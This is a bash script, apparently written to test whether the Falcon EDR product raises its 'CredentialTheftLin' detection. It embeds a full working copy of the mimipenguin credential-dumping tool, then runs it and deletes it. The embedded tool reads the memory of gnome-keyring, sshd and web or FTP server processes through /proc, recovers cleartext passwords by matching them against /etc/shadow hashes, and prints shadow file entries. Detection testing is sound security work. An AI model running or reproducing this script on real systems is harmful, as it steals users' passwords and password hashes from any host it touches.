#!/bin/bash
# 08 - Credential Dumping (mimipenguin)
# Trigger: CredentialTheftLin IOA
# Tactic: Credential Access / Unsecured Credentials
set -e
echo "=== [08] Credential Dumping (mimipenguin) ==="

# Full mimipenguin.sh — dumps cleartext credentials from process memory.
# This is the exact tool that triggers CredentialTheftLin in Falcon.
# Author: Hunter Gregal (github.com/huntergregal/mimipenguin)

cat > /tmp/mimipenguin.sh << 'MIMEOF'
#!/bin/bash
# mimipenguin - dumps cleartext credentials from memory

if [[ "$EUID" -ne 0 ]]; then
    echo "Root required"
    exit 1
fi

export RESULTS=""

command_exists () { command -v "${1}" >/dev/null 2>&1; }

if ! command_exists strings; then
    echo "Error: strings not found"
    exit 1
fi

if command_exists python3; then
    pycmd=python3
elif command_exists python2; then
    pycmd=python2
else
    pycmd=""
fi

function dump_pid () {
    local pid=$1 output_file=$2 system=$3
    local mem_maps
    if [[ $system == "kali" ]]; then
        mem_maps=$(grep -E "^[0-9a-f-]* r" /proc/"$pid"/maps 2>/dev/null | grep -E 'heap|stack' | cut -d' ' -f 1)
    else
        mem_maps=$(grep -E "^[0-9a-f-]* r" /proc/"$pid"/maps 2>/dev/null | cut -d' ' -f 1)
    fi
    while read -r memrange; do
        [ -z "$memrange" ] && continue
        local start stop size
        start=$(echo "$memrange" | cut -d"-" -f 1)
        start=$(printf "%u\n" 0x"$start" 2>/dev/null) || continue
        stop=$(echo "$memrange" | cut -d"-" -f 2)
        stop=$(printf "%u\n" 0x"$stop" 2>/dev/null) || continue
        size=$((stop - start))
        dd if=/proc/"$pid"/mem of="${output_file}"."${pid}" ibs=1 oflag=append conv=notrunc \
            skip="$start" count="$size" > /dev/null 2>&1
    done <<< "$mem_maps"
}

function parse_pass () {
    local DUMP="$1" HASH="$2" SALT="$3" SOURCE="$4"
    local SHADOWHASHES=""

    if [[ ! "$HASH" ]]; then
        SHADOWHASHES="$(cut -d':' -f 2 /etc/shadow 2>/dev/null | grep -E '^\$.\$')"
    fi

    while read -r line; do
        [ -z "$line" ] && continue
        if [[ "$HASH" ]] && [[ -n "$pycmd" ]]; then
            local CTYPE SAFE CRYPT
            CTYPE="$(echo "$HASH" | cut -c-3)"
            SAFE=$(echo "$line" | sed 's/\\/\\\\/g; s/\"/\\"/g;')
            CRYPT="\"$SAFE\", \"$CTYPE$SALT\""
            if [[ $($pycmd -c "from __future__ import print_function; import crypt; print(crypt.crypt($CRYPT))" 2>/dev/null) == "$HASH" ]]; then
                local USER
                USER="$(grep "${HASH}" /etc/shadow | cut -d':' -f 1)"
                export RESULTS="$RESULTS$SOURCE          $USER:$line \n"
            fi
        elif [[ $SHADOWHASHES ]] && [[ -n "$pycmd" ]]; then
            while read -r thishash; do
                [ -z "$thishash" ] && continue
                local CTYPE SHADOWSALT SAFE CRYPT
                CTYPE="$(echo "$thishash" | cut -c-3)"
                SHADOWSALT="$(echo "$thishash" | cut -d'$' -f 3)"
                SAFE=$(echo "$line" | sed 's/\\/\\\\/g; s/\"/\\"/g;')
                CRYPT="\"$SAFE\", \"$CTYPE$SHADOWSALT\""
                if [[ $($pycmd -c "from __future__ import print_function; import crypt; print(crypt.crypt($CRYPT))" 2>/dev/null) == "$thishash" ]]; then
                    local USER
                    USER="$(grep "${thishash}" /etc/shadow | cut -d':' -f 1)"
                    export RESULTS="$RESULTS$SOURCE          $USER:$line\n"
                fi
            done <<< "$SHADOWHASHES"
        else
            export RESULTS="$RESULTS[HIGH]$SOURCE            $line\n"
        fi
    done <<< "$DUMP"
}

# Gnome keyring
if [[ -n $(ps -eo pid,command 2>/dev/null | grep -v 'grep' | grep gnome-keyring) ]]; then
    SOURCE="[SYSTEM - GNOME]"
    PID="$(ps -eo pid,command | sed -rn '/gnome\-keyring\-daemon/p' | awk '{ print $1 }')"
    if [[ $PID ]]; then
        while read -r pid; do
            dump_pid "$pid" /tmp/dump
            HASH="$(strings "/tmp/dump.${pid}" 2>/dev/null | grep -E -m 1 '^\$.\$.+\$')"
            SALT="$(echo "$HASH" | cut -d'$' -f 3)"
            DUMP=$(strings "/tmp/dump.${pid}" 2>/dev/null | grep -E -A 5 -B 5 'libgcrypt\.so')
            DUMP=$(echo "$DUMP" | tr " " "\n" | sort -u)
            parse_pass "$DUMP" "$HASH" "$SALT" "$SOURCE"
            rm -rf "/tmp/dump.${pid}"
        done <<< "$PID"
    fi
fi

# SSH sessions
SOURCE="[SYSTEM - SSH]"
PID="$(ps -eo pid,command 2>/dev/null | grep -E 'sshd:.+@' | grep -v 'grep' | awk '{ print $1 }')"
if [[ "$PID" ]]; then
    while read -r pid; do
        dump_pid "$pid" /tmp/sshd
        HASH="$(strings "/tmp/sshd.${pid}" 2>/dev/null | grep -E -m 1 '^\$.\$.+\$')"
        SALT="$(echo "$HASH" | cut -d'$' -f 3)"
        DUMP=$(strings "/tmp/sshd.${pid}" 2>/dev/null | grep -E -A 3 '^sudo.+')
        DUMP=$(echo "$DUMP" | tr " " "\n" | sort -u)
        parse_pass "$DUMP" "$HASH" "$SALT" "$SOURCE"
    done <<< "$PID"
    rm -rf /tmp/sshd.*
fi

# Fallback: dump any accessible process memory
for pid in $(ps -eo pid,command 2>/dev/null | grep -E '(sshd|gdm|vsftpd|apache|nginx)' | grep -v grep | awk '{print $1}' | head -5); do
    if [ -r "/proc/$pid/maps" ]; then
        dump_pid "$pid" /tmp/memdump
        strings "/tmp/memdump.${pid}" 2>/dev/null | grep -iE '(password|passwd|secret|token)' | head -5 || true
        rm -f "/tmp/memdump.${pid}" 2>/dev/null
    fi
done

# Read shadow file (credential access indicator)
cat /etc/shadow 2>/dev/null | head -5 || true

printf "MimiPenguin Results:\n"
printf "%b" "$RESULTS" | sort -u
unset RESULTS
MIMEOF

chmod +x /tmp/mimipenguin.sh
/tmp/mimipenguin.sh 2>/dev/null || true

# Cleanup
rm -f /tmp/mimipenguin.sh

echo "[08] Done — CredentialTheftLin IOA should trigger"
